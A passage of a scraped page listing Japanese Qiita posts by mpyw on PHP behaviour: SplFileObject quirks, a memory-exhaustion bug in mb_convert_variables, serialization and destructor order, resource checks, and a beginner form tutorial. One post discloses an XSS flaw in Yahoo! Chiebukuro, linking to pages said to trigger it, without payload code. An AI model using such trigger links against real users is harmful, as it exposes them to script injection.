<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>・・・やっぱSplFileObjectのマニュアルがおかしい。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s2">"file.txt"</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fgets</span><span class="p">();</span>
<span class="p">}</span>
</pre></div></div>

<p>さすがにこれは混乱を招くだろ。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />65位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>9</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e764fc8508041b09ae8f">Yahoo!知恵袋にXSS脆弱性を確認</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-22 07:48:38</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[Web]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>現在、「最近見たQ&amp;A」が表示されなくなっています。<br>
暫定的にこのような対応が取られた模様です。<br>
とりあえず一安心（？）</p>

<p>=========================</p>

<p>Yahoo!知恵袋にXSS脆弱性を確認。<br>
2回以上のアクセスでJavaScript発動。</p>

<p>これを開くと再現できます<br>
<a href="http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q12110643517" class="autolink" rel="nofollow noopener" target="_blank">http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q12110643517</a><br>
<a href="http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q14110643154" class="autolink" rel="nofollow noopener" target="_blank">http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q14110643154</a></p>

<p>Togetterまとめ<br>
<a href="http://togetter.com/li/537239" class="autolink" rel="nofollow noopener" target="_blank">http://togetter.com/li/537239</a></p>

<h2>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h2>

<p>なんかすごいの出てきた</p>

<p><a href="http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q10110647045" class="autolink" rel="nofollow noopener" target="_blank">http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q10110647045</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />66位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>8</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/4d0d9f3368a6f67483ee">mb_convert_variables() が再帰参照を検知してくれない</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-27 16:42:07</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[バグ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a><strong>概要</strong>
</h1>

<p>間違いなくバグとすべき内容なので、 <strong><a href="https://bugs.php.net/bug.php?id=66964" rel="nofollow noopener" target="_blank">バグレポート</a></strong> 出しておきました。そのうち修正されると思います。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">再現可能なコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$a</span><span class="p">;</span>
<span class="nb">mb_convert_variables</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">,</span> <span class="s1">'auto'</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果の例</span></div>
<div class="highlight"><pre><span></span>Fatal error:  Out of memory (allocated 542113792) (tried to allocate 541851648 bytes) in ... on line 3
</pre></div>
</div>

<h1>
<span id="なぜ気づいたか" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C%E6%B0%97%E3%81%A5%E3%81%84%E3%81%9F%E3%81%8B"><i class="fa fa-link"></i></a><strong>なぜ気づいたか</strong>
</h1>

<p><strong><a href="http://qiita.com/mpyw/items/6bd99ff62571c02feaa1" id="reference-62a3c065d4b9321ce04e">まとめて例外をスローする小技</a></strong> にて、毎回例外用の変数をNULL初期化するのが面倒なので、引数を参照渡しで受け取って自動的に初期化するようにしたコード。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>
<span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'B'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">mb_convert_variables</span><span class="p">(</span><span class="s1">'UTF-8'</span><span class="p">,</span> <span class="s1">'auto'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>WindowsでMySQLなんかを動かしてるとこういったメッセージが <code>CP932</code> で返ってくるので、さすがにこれは <code>UTF-8</code> に変換する必要があると感じ、このコードを書いて気づいたところです。とりあえず <strong><a href="http://www.php.net/manual/ja/function.mb-convert-variables.php" rel="nofollow noopener" target="_blank">mb_convert_variables</a></strong> の代わりに <strong><a href="http://www.php.net/manual/ja/function.mb-convert-encoding.php" rel="nofollow noopener" target="_blank">mb_convert_encoding</a></strong> を使うようにして解決しました。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />67位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>8</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/09ab5a42b54189292bea">__destruct() と __sleep() の順序</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-12 23:39:47</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>ぶち当たったのでメモ。</p>

<h1>
<span id="__destruct-と-__sleep" class="fragment"></span><a href="#__destruct-%E3%81%A8-__sleep"><i class="fa fa-link"></i></a><code>__destruct()</code> と <code>__sleep()</code>
</h1>

<p>以下のようなクラスがあるとする。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>

    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"__sleep() called</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"__destruct() called</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h2>
<span id="1-serialize-を実行するとき" class="fragment"></span><a href="#1-serialize-%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>1. <code>serialize()</code> を実行するとき</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Test</span><span class="p">);</span>
</pre></div></div>

<p>インスタンスを作ってシリアライズを実行、そのままガベージコレクションを発動させるコード。このときは当然</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>__sleep() called
__destruct() called
</pre></div></div>

<p>となるが・・・</p>

<h2>
<span id="2-_session-が保存されるとき" class="fragment"></span><a href="#2-_session-%E3%81%8C%E4%BF%9D%E5%AD%98%E3%81%95%E3%82%8C%E3%82%8B%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>2. <code>$_SESSION</code> が保存されるとき</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'test'</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">;</span>
</pre></div></div>

<p>PHPはスクリプト終了時に <code>session_encode()</code> を使ってセッションの特殊なシリアライズを行うが、このときは</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>__destruct() called
__sleep() called
</pre></div></div>

<p><ins>デストラクタが先に呼ばれてしまう。</ins>自前のシリアライズとセッションへの格納を両方とも想定する場合、どちらが先にコールされても不具合が発生しないようにクラスを設計しておく必要がある。 <code>is_resource()</code> なんかが役に立つんじゃないだろうか。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">tmpfile</span><span class="p">();</span>
<span class="k">echo</span> <span class="s2">"【Before fclose():】</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'var_dump($fp): '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">echo</span> <span class="s1">'(bool)$fp: '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">((</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">echo</span> <span class="s1">'is_resource($fp): '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$fp</span><span class="p">));</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"【After fclose():】</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'var_dump($fp): '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">echo</span> <span class="s1">'(bool)$fp: '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">((</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">echo</span> <span class="s1">'is_resource($fp): '</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$fp</span><span class="p">));</span>
</pre></div></div>

<p>この実行結果は下記のようになる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>【Before fclose():】
var_dump($fp): resource(1) of type (stream)
(bool)$fp: bool(true)
is_resource($fp): bool(true)

【After fclose():】
var_dump($fp): resource(1) of type (Unknown)
(bool)$fp: bool(true)
is_resource($fp): bool(false)
</pre></div></div>

<p><code>is_resource()</code> は解放したリソースに関しては <code>FALSE</code> を返すが、ブール判定はそうではないので間違えないように。</p>

<h1>
<span id="__destruct-と-serialize" class="fragment"></span><a href="#__destruct-%E3%81%A8-serialize"><i class="fa fa-link"></i></a><code>__destruct()</code> と <code>serialize()</code>
</h1>

<p>こちらも同様の結果となった。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Test</span> <span class="k">implements</span> <span class="nx">Serializable</span> <span class="p">{</span>

    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">serialize</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"serialize() called</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"__destruct() called</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h1>
<span id="追記-解決法" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98-%E8%A7%A3%E6%B1%BA%E6%B3%95"><i class="fa fa-link"></i></a>【追記】 解決法</h1>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHP5.4以降専用</span></div>
<div class="highlight"><pre><span></span><span class="nb">session_register_shutdown</span><span class="p">();</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHP5.3以前向け</span></div>
<div class="highlight"><pre><span></span><span class="nb">register_shutdown_function</span><span class="p">(</span><span class="s1">'session_write_close'</span><span class="p">);</span>
</pre></div>
</div>

<p>でセッションが保存される時の挙動を <code>serialize()</code> するときの挙動に近づけられるようだ。詳しくはコメント欄を参照。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />68位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>7</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/60da2c08d384a53ec47e">PHPのリソースに対する認識、間違っていませんか…？</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-01-17 14:21:13</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[リソース]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="解放されたリソースの扱い" class="fragment"></span><a href="#%E8%A7%A3%E6%94%BE%E3%81%95%E3%82%8C%E3%81%9F%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AE%E6%89%B1%E3%81%84"><i class="fa fa-link"></i></a>解放されたリソースの扱い</h1>

<h2>
<span id="検証" class="fragment"></span><a href="#%E6%A4%9C%E8%A8%BC"><i class="fa fa-link"></i></a>検証</h2>

<p>次のコードを試してみてください。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">resource_test</span><span class="p">(</span><span class="nv">$resource</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> 
        <span class="s1">'['</span> <span class="o">.</span> <span class="nv">$name</span><span class="o">.</span> <span class="s1">']'</span><span class="p">,</span>
        <span class="nx">PHP_EOL</span><span class="p">,</span>
        <span class="s1">'(bool)$resource =&gt; '</span><span class="p">,</span>
        <span class="nv">$resource</span> <span class="o">?</span> <span class="s1">'TRUE'</span> <span class="o">:</span> <span class="s1">'FALSE'</span><span class="p">,</span>
        <span class="nx">PHP_EOL</span><span class="p">,</span>
        <span class="s1">'get_resource_type($resource) =&gt; '</span><span class="p">,</span>
        <span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">'FALSE'</span><span class="p">,</span>
        <span class="nx">PHP_EOL</span><span class="p">,</span>
        <span class="s1">'is_resoruce($resource) =&gt; '</span><span class="p">,</span>
        <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">?</span> <span class="s1">'TRUE'</span> <span class="o">:</span> <span class="s1">'FALSE'</span><span class="p">,</span>
        <span class="nx">PHP_EOL</span><span class="p">,</span>
        <span class="nx">PHP_EOL</span>
    <span class="p">;</span>
<span class="p">}</span>

<span class="nv">$resource</span> <span class="o">=</span> <span class="nb">tmpfile</span><span class="p">();</span>
<span class="nx">resource_test</span><span class="p">(</span><span class="nv">$resource</span><span class="p">,</span> <span class="s1">'Check Valid Resource'</span><span class="p">);</span>

<span class="nb">fclose</span><span class="p">(</span><span class="nv">$resource</span><span class="p">);</span>
<span class="nx">resource_test</span><span class="p">(</span><span class="nv">$resource</span><span class="p">,</span> <span class="s1">'Check Released Resource'</span><span class="p">);</span>

<span class="nv">$resource</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nx">resource_test</span><span class="p">(</span><span class="nv">$resource</span><span class="p">,</span> <span class="s1">'Check NULL'</span><span class="p">);</span>
</pre></div></div>

<p>実行結果は以下のようになるでしょう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="p">[</span><span class="nx">Check</span> <span class="nx">Valid</span> <span class="nx">Resource</span><span class="p">]</span>
<span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$resource</span> <span class="o">=&gt;</span> <span class="k">TRUE</span>
<span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">stream</span>
<span class="nx">is_resoruce</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">TRUE</span>

<span class="p">[</span><span class="nx">Check</span> <span class="nx">Released</span> <span class="nx">Resource</span><span class="p">]</span>
<span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$resource</span> <span class="o">=&gt;</span> <span class="k">TRUE</span>
<span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">Unknown</span>
<span class="nx">is_resoruce</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">FALSE</span>

<span class="p">[</span><span class="nx">Check</span> <span class="k">NULL</span><span class="p">]</span>
<span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$resource</span> <span class="o">=&gt;</span> <span class="k">FALSE</span>
<span class="nb">get_resource_type</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">FALSE</span>
<span class="nx">Warning</span><span class="o">:</span>  <span class="nb">get_resource_type</span><span class="p">()</span> <span class="nx">expects</span> <span class="nx">parameter</span> <span class="mi">1</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">resource</span><span class="p">,</span> <span class="k">null</span> <span class="nx">given</span> <span class="nx">in</span> <span class="o">...</span> <span class="nx">on</span> <span class="nx">line</span> <span class="mi">10</span>
<span class="nx">is_resoruce</span><span class="p">(</span><span class="nv">$resource</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">FALSE</span>
</pre></div></div>

<h2>
<span id="ポイント" class="fragment"></span><a href="#%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>ポイント</h2>

<ul>
<li>リソース型の値は論理型にキャストしたとき必ず<code>True</code>になる。</li>
<li>リソースは解放されるとリソースタイプが<code>"Unknown"</code>に変化する。<code>is_resource</code>関数はリソース型であるかどうかのチェックの後、<ins>リソースタイプが</ins><strong><code>"Unknown"</code></strong><ins>でないかどうか</ins>のチェックも行う。</li>
<li>
<code>is_resource</code>関数は全ての値を受け付けるが、 <strong><code>get_resource_type</code></strong><ins>関数はリソース型の値しか受け付けない</ins>。</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />69位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>7</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/55369c245b0d22755151">【PHP入門講座】 ユーザーに挨拶してみよう</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 23:13:44</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-1563d7c59d124990a6f3">目次に戻る</a>
</h3>

<h1>
<span id="formphp-の作成" class="fragment"></span><a href="#formphp-%E3%81%AE%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a><code>form.php</code> の作成</h1>

<p>いよいよ実際にフォームを作成してみます。テキストエディタで </p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="c1">// Content-Typeヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>サンプルフォーム<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"welcome.php"</span><span class="p">&gt;</span>
    お名前： <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"my_name"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<p>と入力した後、<code>form.php</code> としてルートディレクトリに保存してください。<br>
そして、<code>http://localhost/form.php</code> にアクセスして</p>

<p><a href="https://camo.qiitausercontent.com/bb8490d34f98f23c14f3015564750cadd66d18a7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f38326231393738362d326435392d636665322d663733382d3661333764623739653034372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/bb8490d34f98f23c14f3015564750cadd66d18a7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f38326231393738362d326435392d636665322d663733382d3661333764623739653034372e706e67" alt="ss (2013-11-25 at 10.01.02).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/82b19786-2d59-cfe2-f738-6a37db79e047.png"></a></p>

<p>と表示されれば成功です。表示に失敗した場合はXHTMLの構文を誤っている可能性があります。</p>

<h1>
<span id="入力フォーム作成のポイント" class="fragment"></span><a href="#%E5%85%A5%E5%8A%9B%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E4%BD%9C%E6%88%90%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>入力フォーム作成のポイント</h1>

<h2>
<span id="開始タグと終了タグの構造が正しい必要がある" class="fragment"></span><a href="#%E9%96%8B%E5%A7%8B%E3%82%BF%E3%82%B0%E3%81%A8%E7%B5%82%E4%BA%86%E3%82%BF%E3%82%B0%E3%81%AE%E6%A7%8B%E9%80%A0%E3%81%8C%E6%AD%A3%E3%81%97%E3%81%84%E5%BF%85%E8%A6%81%E3%81%8C%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a>開始タグと終了タグの構造が正しい必要がある</h2>

<p>HTMLでは、例えばリスト生成において</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>あ
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>い
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>う
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div></div>

<p>のように終了タグを省略できるケースがありましたが、XHTMLでは一切の省略は認められません。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>あ<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>い<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>う<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div></div>

<h2>
